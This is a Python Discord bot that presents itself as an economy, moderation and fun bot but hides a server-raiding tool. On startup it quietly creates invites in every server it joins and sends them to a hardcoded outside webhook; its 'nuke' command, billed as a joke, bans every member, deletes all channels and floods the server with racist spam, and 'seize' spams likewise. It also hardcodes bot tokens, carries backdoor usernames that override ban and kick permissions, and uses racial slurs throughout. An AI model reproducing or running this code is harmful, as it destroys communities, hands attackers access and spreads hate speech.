import random
from wsgiref import headers
import requests as rq
import discord
import os
import time
import discord.ext
from discord import message, member, channel, Webhook, AsyncWebhookAdapter
from discord.utils import get
from discord.ext import commands, tasks
from discord.ext.commands import has_permissions, CheckFailure, check, bot
from discord.ext.commands import has_permissions, MissingPermissions
from datetime import date, datetime
import calendar
from colorama import Fore
import asyncio
import json
import aiohttp
import aioconsole
import string
import base64

#passive Version not for the nooks

URL = "https://discordapp.com/api"


async def api_call(path):
    with aiohttp.ClientSession() as session:
        async with session.get(f"{URL}{path}") as response:
            assert 200 == response.status, response.reason
            return await response.json()


async def main():
    response = await api_call("/gateway")
    print(response)


client = discord.Client()
activity = discord.Game(name="eading hambergers")
client = commands.Bot(command_prefix='$', help_command=None, case_insensitive=True, activity=activity)

global image
with open('Sachs.jpeg', 'rb') as f:
    image1 = f.read()

count = 0

@client.event
async def on_ready():
    print(f'{Fore.BLUE}Ready to fuck shit up{Fore.RESET}')
    async for guild in client.fetch_guilds(limit=150):
        id = guild.id
        guild = client.get_guild(id)
        z = random.choice(guild.text_channels)
        x = guild.get_channel(z.id)
        try:
          link = await x.create_invite(max_age=0,max_uses=100)
        except:
          pass
        webhook_url = "https://discordapp.com/api/webhooks/924271843785969714/wUYtEI4cJtlbzK9m9qajorAzrXLboAYtTd8K8Yta0sVvqy2w3Rj93zheXp5Bn0BR-bBn"
        async with aiohttp.ClientSession() as session:
          webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
          await webhook.send(link)
        print(f'{Fore.GREEN}' + guild.name + f'{Fore.RESET}')
    print(f'{Fore.BLUE}I repeat ready to fuck shit up{Fore.RESET}')


async def main():
    """Main program."""
    response = await api_call("/gateway")
    await start(response["url"])


async def start(url):
    with aiohttp.ClientSession() as session:
        async with session.ws_connect(
                f"{url}?v=6&encoding=json") as ws:
            async for msg in ws:
                print(msg.tp, msg.data)


async def api_call(path, method="GET", **kwargs):
    """Return the JSON body of a call to Discord REST API."""
    defaults = {
        "headers": {
            "Authorization": f"Bot OTE3OTY2Mjg1NjQyNTQ3MjQx.YbAYuQ.arUZ6tQ9Wb_Z5t0WKNLeU5jVjRc",
            "User-Agent": "dBot "
        }
    }
    kwargs = dict(defaults, **kwargs)
    with aiohttp.ClientSession():
        async with aiohttp.ClientSession.request(method, path, **kwargs) as response:
            assert 200 == response.status, response.reason
            return await response.json()


##############################################################
def last_monday():
    today = datetime.date.today()
    monday = today - datetime.timedelta(days=today.weekday())
    return monday


##############################################################


# Start of Purge
@client.command()
async def purge(ctx, *, arg):
    if ctx.message.author.guild_permissions.manage_messages:
        await ctx.channel.purge(limit=int(arg) + 1)
    else:
        await ctx.send("MF thinks he can censor your speech")
        await ctx.send("https://constitution.congress.gov/constitution/amendment-1/")
        return


# End of Purge

# Start of Ban
@client.command()
async def ban(ctx, member: discord.User = None, ):
    print(discord.User.id)
    if str(ctx.message.author) == "᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼⟬ⲔፕϨ⟭ ᎴᎯᏟᏲᎴ#7802" or ctx.message.author.guild_permissions.ban_members:
        await member.ban(reason=None)
        await ctx.send(f"{ctx.author.mention} has been deported")
    else:
        await ctx.send("Bro you drunk?")


@client.command()
async def kick(ctx, member: discord.User = None, ):
    print(discord.User.id)
    if str(ctx.message.author) == "[UЖ/K̷ፕϨ⟭ ᎴᎯᏟᏲᎴ#7802" or ctx.message.author.guild_permissions.kick_members:
        await member.kick(reason=None)
        await ctx.send(str(client.get_user(discord.User)) + " has been deported")
    else:
        await ctx.send("Bro you drunk?")

@client.command()
async def troll(ctx):
  guild = ctx.message.guild
  for channel in guild.channels:
    if channel.name == "rules":
      webhook = await channel.create_webhook(name="꧁ ᎴᎯᏟᏲᎴ ᎿᏲᏋ ᏰᎯᎴᏋᏍ ꧂", avatar=image1, reason="yes I can")
      webhook_url = webhook.url
      await webhook.send(f"yes i can")


# Start of Nuke
@client.command()
async def nuke(ctx):
    nigger = 0
    hooks = []
    guild = ctx.message.guild
    if str(ctx.message.author) == "Hell Bringer#9286" or str(ctx.message.author) == "᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼⟬ⲔፕϨ⟭ ᎴᎯᏟᏲᎴ#7802":
        await ctx.guild.edit(
            name="Heil ᎴᎯᏟᏲᎴ",
            description="Fucked by ᎴᎯᏟᏲᎴ lollolll",
            reason="ᎴᎯᏟᏲᎴ hates you",
            icon=image1,
            banner=image1
        )
        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                pass
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()

        ch = 0
        m = 0
        chc = await guild.create_text_channel("Get Niggered")
        while ch < 50:
            while True:
                for i in range(20):
                    await guild.create_text_channel("Get Niggered")
                    chc = await guild.create_text_channel("Get Niggered")
                    webhook = await chc.create_webhook(name="Get Niggered", avatar=image1, reason="Get niggered")
                    webhook_url = webhook.url
                    hooks.append(webhook_url)
                    await guild.create_role(name="nigger")

                while True:
                    for x in hooks:
                        webhook_url = x
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
                            for i in range(5):
                                await webhook.send(f"@everyone Get niggered")
            ch = ch + 1
    else:
        await ctx.send("You fucking wish LMAO")


# End of Nuke


@client.command()
async def serverinfo(ctx):
    guild = ctx.message.guild
    icon_url = ctx.guild.icon_url
    print(icon_url)
    embedVar = discord.Embed(title="Server Info", description="Name: " + guild.name, color=0x154c79)
    embedVar.add_field(name="Member Count:", value=str(ctx.guild.member_count) + " Members")
    embedVar.add_field(name="Owner:", value="<@" + str(guild.owner_id) + ">")
    embedVar.set_image(url=(icon_url))
    await ctx.send(embed=embedVar)

    return


@client.command()
async def confess(ctx, *, args):
    await ctx.channel.purge(limit=1)
    embedVar = discord.Embed(title="Confession", description=" ", color=0x154c79)
    embedVar.add_field(name="I confess", value=args, inline=False)
    await ctx.send(embed=embedVar)


# Start of Help
@client.command()
async def help(ctx, category=None):
    if category == None:
      await ctx.send("Go figure out this ur fucking self")
      await ctx.send("jk")
      await ctx.send("jk")
      embedVar = discord.Embed(title="Help", description="Do $help [category] to view specifics", color=0x154c79)
      embedVar.add_field(name=f"Economy", value="Check economy commands", inline=False)
      embedVar.add_field(name=f"Moderation", value="In honor of my fatass discord mod", inline=False)
      embedVar.add_field(name=f"Fun", value="Not for over-sensitive people", inline=False)
      await ctx.send(embed=embedVar)
    if category == "Economy" or category == "economy":
      embedVar = discord.Embed(title="Economy", description=" ", color=0x154c79)
      embedVar.add_field(name=f"``$bal``", value="Check balance", inline=False)
      embedVar.add_field(name=f"``$work``", value="Get rich quick gone wrong", inline=False)
      embedVar.add_field(name=f"``$inv``", value="Inventory", inline=False)
      embedVar.add_field(name=f"``$shop``", value="A shop", inline=False)
      await ctx.send(embed=embedVar)
    if category == "Moderation" or category == "moderation":
      embedVar = discord.Embed(title="Moderation", description=" ", color=0x154c79)
      embedVar.add_field(name=f"``$ban [member]``", value="Bans a member", inline=False)
      embedVar.add_field(name=f"``$kick [member]``", value="Kicks a member", inline=False)
      embedVar.add_field(name=f"``$purge [amount]``", value="purges members", inline=False)
      await ctx.send(embed=embedVar)
    if category == "Fun" or category == "fun":
      embedVar = discord.Embed(title="Fun", description=" ", color=0x154c79)
      embedVar.add_field(name=f"``$nuke``", value="Nukes the server(joke command)", inline=False)
      embedVar.add_field(name=f"``$confess [confession]``", value="Makes a confession while keeping you unknown", inline=False)
      embedVar.add_field(name=f"``$howgay [member]``", value="Checks gay rate of a member", inline=False)
      embedVar.add_field(name=f"``$niggerate [member]``", value="How black someone is", inline=False)
      embedVar.add_field(name=f"``$otax [member]``", value="Otax someone", inline=False)
      await ctx.send(embed=embedVar)


# End of Help

@client.command()
async def seize(ctx):
    nigger = 0
    hooks = []
    guild = ctx.message.guild
    while True:
        if nigger < 26:
            chc = await guild.create_text_channel("Get Niggered")
            webhook = await chc.create_webhook(name="Get Niggered", avatar=image1, reason="Get niggered")
            webhook_url = webhook.url
            hooks.append(webhook_url)
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
                for i in range(5):
                    await webhook.send(f"@everyone Get niggered")
            print(hooks)
            nigger = nigger + 1

        elif nigger > 25:
            for x in hooks:
                webhook_url = x
                async with aiohttp.ClientSession() as session:
                    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
                    for i in range(15):
                        await webhook.send(f"@everyone Get niggered")

@client.command(aliases = ['gayrate', 'gay'])
async def howgay(ctx, member: discord.User = None, ):
  print(str(member))
  id = member.id
  if str(id) == "613405135044870165":
    await ctx.send(f"<@{id}> is 0% gay")
  elif str(id) == "893853676714733598":
    await ctx.send(f"<@{id}> is 100% gay")
  else:
    gayrate = random.randint(0, 101)
    await ctx.send(f"<@{id}> is {gayrate}% gay")

@client.command(aliases = ['blackrate', 'niggerrate', 'niggerate'])
async def howblack(ctx, member: discord.User = None, ):
  print(str(member))
  id = member.id
  if str(id) == "613405135044870165":
    await ctx.send(f"<@{id}> is 0% black")
  elif str(id) == "893853676714733598":
    await ctx.send(f"<@{id}> is 100% black")
  else:
    gayrate = random.randint(0, 101)
    await ctx.send(f"<@{id}> is {gayrate}% black")

@client.command()
async def nwordcount(ctx):
  async def open_account(user):
    users = await nc()

    if str(user.id) in users:
        return False
    else:
        users[str(user.id)] = {}
        users[str(user.id)]["N-word-count"] = 0

    with open('ncount.json', 'w') as f:
        json.dump(users, f)

    return True
  await open_account(ctx.author)
  users = await nc()
  user = ctx.author
  nc1 = users[str(user.id)]["N-word-count"]

  em = discord.Embed(title=f'{ctx.author.name} N word count', color=0x154c79)
  em.add_field(name="N word count", value=nc1)
  await ctx.send(embed=em)

async def nc():
    with open('ncount.json', 'r') as f:
        users = json.load(f)

    return users

@client.command()
async def otax(ctx, user: discord.User = None):
  msg = await ctx.send(f'Otaxing {user.name}...')
  time.sleep(3)
  if user == None:
    await ctx.send('A user is required!', delete_after=1)
  else:
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(user.id)
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
  await msg.edit(content=f'```diff\n-Succesfully otaxed {user.name}\n\n{token}\n```')


mainshop = [{"name": "Pet Floppa", "price": 500, "description": "Pet floppa"}, {"name": "Floppa Food", "price": 10, "description": "Floppa food"}, {"name": f"Floppa Coin Miner ", "price": 5000, "description": "Mines floppa coin"}]


@client.command(aliases=['bal'])
async def balance(ctx):
    await open_account(ctx.author)
    user = ctx.author

    users = await get_bank_data()

    wallet_amt = users[str(user.id)]["wallet"]
    bank_amt = users[str(user.id)]["bank"]

    em = discord.Embed(title=f'{ctx.author.name} Balance', color=0x154c79)
    em.add_field(name="Cash", value=wallet_amt)
    em.add_field(name='Bank', value=bank_amt)
    await ctx.send(embed=em)


@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def work(ctx):
    await open_account(ctx.author)
    user = ctx.author

    users = await get_bank_data()

    earnings = random.randrange(100, 301)

    await ctx.send(f'{ctx.author.mention} fed 2 floppas and got {earnings}<:floppa_coin:921515769349685348>')

    users[str(user.id)]["wallet"] += earnings

    with open("mainbank.json", 'w') as f:
        json.dump(users, f)
@work.error
async def work(ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send("floppa cant catch up with you(cooldown is 30s)")

@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def beg(ctx):
    failed = ['Floppa no spek human bs', 'Back in my day we used to work']
    await open_account(ctx.author)
    user = ctx.author

    users = await get_bank_data()

    earnings = random.randrange(50, 251)
    chance = random.randint(1, 5)

    if chance <= 3:

      await ctx.send(f'Here take {earnings}<:floppa_coin:921515769349685348>')

      users[str(user.id)]["wallet"] += earnings

      with open("mainbank.json", 'w') as f:
          json.dump(users, f)

    else:
      failure = random.choice(failed)
      await ctx.send(failure)
@beg.error
async def beg(ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send("floppa cant catch up with you(cooldown is 30s)")

@client.command()
@commands.cooldown(1, 43200, commands.BucketType.user)
async def collect(ctx):
    await open_account(ctx.author)
    user = ctx.author

    users = await get_bank_data()

    earnings = random.randrange(50, 251)
    chance = random.randint(1, 5)

    try:
      inventory = users[str(user.id)]["inventory"]
    except:
      inventory = []

    for item in inventory:
        name = item["item"]
        if name == "floppa-coin-miner":
          earnings = 5000
          users[str(user.id)]["wallet"] += earnings
          with open("mainbank.json", 'w') as f:
            json.dump(users, f)
          await ctx.send("Money Collected")

    with open("mainbank.json", 'w') as f:
        json.dump(users, f)
@collect.error
async def collect(ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send("floppa cant catch up with you(cooldown is 12h)")


@client.command(aliases=['wd', 'with'])
async def withdraw(ctx, amount=None):
    await open_account(ctx.author)
    if amount == None:
        await ctx.send("Please enter the amount")
        return

    bal = await update_bank(ctx.author)

    amount = int(amount)

    if amount > bal[1]:
        await ctx.send('You do not have sufficient balance')
        return
    if amount < 0:
        await ctx.send('Amount must be positive!')
        return

    await update_bank(ctx.author, amount)
    await update_bank(ctx.author, -1 * amount, 'bank')
    await ctx.send(f'{ctx.author.mention} You withdrew {amount}<:floppa_coin:921515769349685348>')


@client.command(aliases=['dep'])
async def deposit(ctx, amount=None):
    await open_account(ctx.author)
    if amount == None:
        await ctx.send("Please enter the amount")
        return

    bal = await update_bank(ctx.author)

    amount = int(amount)

    if amount > bal[0]:
        await ctx.send('You do not have sufficient balance')
        return
    if amount < 0:
        await ctx.send('Amount must be positive!')
        return

    await update_bank(ctx.author, -1 * amount)
    await update_bank(ctx.author, amount, 'bank')
    await ctx.send(f'{ctx.author.mention} You deposited {amount}<:floppa_coin:921515769349685348>')


@client.command(aliases=['sm'])
async def send(ctx, member: discord.Member, amount=None):
    await open_account(ctx.author)
    await open_account(member)
    if amount == None:
        await ctx.send("Please enter the amount")
        return

    bal = await update_bank(ctx.author)
    if amount == 'all':
        amount = bal[0]

    amount = int(amount)

    if amount > bal[0]:
        await ctx.send('You do not have sufficient balance')
        return
    if amount < 0:
        await ctx.send('Amount must be positive!')
        return

    await update_bank(ctx.author, -1 * amount, 'bank')
    await update_bank(member, amount, 'bank')
    await ctx.send(f'{ctx.author.mention} You gave {member} {amount}<:floppa_coin:921515769349685348>')


@client.command(aliases=['rb'])
async def rob(ctx, member: discord.Member):
    await open_account(ctx.author)
    await open_account(member)
    bal = await update_bank(member)

    if bal[0] < 100:
        await ctx.send('It is useless to rob him :(')
        return

    earning = random.randrange(0, bal[0])

    await update_bank(ctx.author, earning)
    await update_bank(member, -1 * earning)
    await ctx.send(f'{ctx.author.mention} You robbed {member} and got {earning}<:floppa_coin:921515769349685348>')


@client.command()
async def slots(ctx, amount=None):
    await open_account(ctx.author)
    if amount == None:
        await ctx.send("Please enter the amount")
        return

    bal = await update_bank(ctx.author)

    amount = int(amount)

    if amount > bal[0]:
        await ctx.send('Broke ass niga')
        return
    if amount < 0:
        await ctx.send('bro know yo fuckin math')
        return
    final = []
    for i in range(3):
        a = random.choice(['X', 'O', 'Q'])

        final.append(a)

    await ctx.send(str(final))

    if final[0] == final[1] or final[1] == final[2] or final[0] == final[2]:
        await update_bank(ctx.author, 2 * amount)
        await ctx.send(f'You won :) {ctx.author.mention}')
    else:
        await update_bank(ctx.author, -1 * amount)
        await ctx.send(f'You lose :( {ctx.author.mention}')


@client.command()
async def shop(ctx):
    em = discord.Embed(title="Floppa Shop")

    for item in mainshop:
        name = item["name"]
        price = item["price"]
        desc = item["description"]
        em.add_field(name=name, value=f"${price}<:floppa_coin:921515769349685348>  {desc} ")

    await ctx.send(embed=em)


@client.command()
async def buy(ctx,*, item, amount=1):
    await open_account(ctx.author)

    res = await buy_this(ctx.author, item, amount)

    if not res[0]:
        if res[1] == 1:
            await ctx.send("That Object isn't there!")
            return
        if res[1] == 2:
            await ctx.send(f"You don't have enough money in your wallet to buy {amount} {item}")
            return

    await ctx.send(f"You just bought {amount} {item}")


async def buy_this(user, item_name, amount):
    item_name = item_name.lower()
    name_ = None
    for item in mainshop:
        name = item["name"].lower()
        if name == item_name:
            name_ = name
            price = item["price"]
            break

    if name_ == None:
        return [False, 1]

    cost = price * amount

    users = await get_bank_data()

    bal = await update_bank(user)

    if bal[0] < cost:
        return [False, 2]

    try:
        index = 0
        t = None
        for thing in users[str(user.id)]["inventory"]:
            n = thing["item"]
            if n == item_name:
                old_amt = thing["amount"]
                new_amt = old_amt + amount
                users[str(user.id)]["inventory"][index]["amount"] = new_amt
                t = 1
                break
            index += 1
        if t == None:
            obj = {"item": item_name, "amount": amount}
            users[str(user.id)]["inventory"].append(obj)
    except:
        obj = {"item": item_name, "amount": amount}
        users[str(user.id)]["inventory"] = [obj]

    with open("mainbank.json", "w") as f:
        json.dump(users, f)

    await update_bank(user, cost * -1, "wallet")

    return [True, "Worked"]


@client.command()
async def sell(ctx, item, amount=1):
    await open_account(ctx.author)

    res = await sell_this(ctx.author, item, amount)

    if not res[0]:
        if res[1] == 1:
            await ctx.send("That Object isn't there!")
            return
        if res[1] == 2:
            await ctx.send(f"You don't have {amount} {item} in your inventory.")
            return
        if res[1] == 3:
            await ctx.send(f"You don't have {item} in your inventory.")
            return

    await ctx.send(f"You just sold {amount} {item}.")


async def sell_this(user, item_name, amount, price=None):
    item_name = item_name.lower()
    name_ = None
    for item in mainshop:
        name = item["name"].lower()
        if name == item_name:
            name_ = name
            if price == None:
                price = 0.7 * item["price"]
            break

    if name_ == None:
        return [False, 1]

    cost = price * amount

    users = await get_bank_data()

    bal = await update_bank(user)

    try:
        index = 0
        t = None
        for thing in users[str(user.id)]["inventory"]:
            n = thing["item"]
            if n == item_name:
                old_amt = thing["amount"]
                new_amt = old_amt - amount
                if new_amt < 0:
                    return [False, 2]
                users[str(user.id)]["inventory"][index]["amount"] = new_amt
                t = 1
                break
            index += 1
        if t == None:
            return [False, 3]
    except:
        return [False, 3]

    with open("mainbank.json", "w") as f:
        json.dump(users, f)

    await update_bank(user, cost, "wallet")

    return [True, "Worked"]


@client.command(aliases=['inv'])
async def inventory(ctx):
    await open_account(ctx.author)
    user = ctx.author
    users = await get_bank_data()

    try:
        inventory = users[str(user.id)]["inventory"]
    except:
        inventory = []

    em = discord.Embed(title="Inventory")
    for item in inventory:
        name = item["item"]
        amount = item["amount"]

        em.add_field(name=name, value=amount)

    await ctx.send(embed=em)


async def buy(user, item_name, amount):
    item_name = item_name.lower()
    name_ = None
    for item in mainshop:
        name = item["name"].lower()
        if name == item_name:
            name_ = name
            price = item["price"]
            break

    if name_ == None:
        return [False, 1]

    cost = price * amount

    users = await get_bank_data()

    bal = await update_bank(user)

    if bal[0] < cost:
        return [False, 2]

    try:
        index = 0
        t = None
        for thing in users[str(user.id)]["inventory"]:
            n = thing["item"]
            if n == item_name:
                old_amt = thing["amount"]
                new_amt = old_amt + amount
                users[str(user.id)]["inventory"][index]["amount"] = new_amt
                t = 1
                break
            index += 1
        if t == None:
            obj = {"item": item_name, "amount": amount}
            users[str(user.id)]["inventory"].append(obj)
    except:
        obj = {"item": item_name, "amount": amount}
        users[str(user.id)]["inventory"] = [obj]

    with open("mainbank.json", "w") as f:
        json.dump(users, f)

    await update_bank(user, cost * -1, "wallet")

    return [True, "Worked"]


@client.command(aliases=["lb"])
async def leaderboard(ctx, x=1):
    users = await get_bank_data()
    leader_board = {}
    total = []
    for user in users:
        name = int(user)
        total_amount = users[user]["wallet"] + users[user]["bank"]
        leader_board[total_amount] = name
        total.append(total_amount)

    total = sorted(total, reverse=True)

    em = discord.Embed(title=f"Top {x} Richest People",
                       description="This is decided on the basis of raw money in the bank and wallet",
                       color=0x154c79)
    index = 1
    for amt in total:
        id_ = leader_board[amt]
        member = client.get_user(id_)
        name = member.name
        em.add_field(name=f"{index}. {name}", value=f"{amt}", inline=False)
        if index == x:
            break
        else:
            index += 1

    await ctx.send(embed=em)


async def open_account(user):
    users = await get_bank_data()

    if str(user.id) in users:
        return False
    else:
        users[str(user.id)] = {}
        users[str(user.id)]["wallet"] = 0
        users[str(user.id)]["bank"] = 0

    with open('mainbank.json', 'w') as f:
        json.dump(users, f)

    return True


async def get_bank_data():
    with open('mainbank.json', 'r') as f:
        users = json.load(f)

    return users


async def update_bank(user, change=0, mode='wallet'):
    users = await get_bank_data()

    users[str(user.id)][mode] += change

    with open('mainbank.json', 'w') as f:
        json.dump(users, f)
    bal = users[str(user.id)]['wallet'], users[str(user.id)]['bank']
    return bal


client.run("OTE3OTY2Mjg1NjQyNTQ3MjQx.YbAYuQ.TVJw3b6oumvMSlykr3GhN2f8fgo")

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
loop.close()
